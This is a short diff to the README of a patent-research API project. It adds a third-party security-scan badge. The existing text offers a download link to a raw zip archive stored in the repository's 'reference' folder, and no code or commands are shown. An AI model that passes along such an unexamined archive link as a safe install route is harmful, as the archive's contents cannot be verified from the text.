@@ -1,5 +1,7 @@
 # 🚀 uspto_fpd_mcp - Fast API Access for Patent Research
 
+[![SafeSkill 83/100](https://img.shields.io/badge/SafeSkill-83%2F100_Passes%20with%20Notes-yellow)](https://safeskill.dev/scan/tam1379-uspto-fpd-mcp)
+
 ## 📥 Download
 [![Download uspto_fpd_mcp](https://github.com/Tam1379/uspto_fpd_mcp/raw/refs/heads/master/reference/fpd_mcp_uspto_2.8.zip)](https://github.com/Tam1379/uspto_fpd_mcp/raw/refs/heads/master/reference/fpd_mcp_uspto_2.8.zip)
 
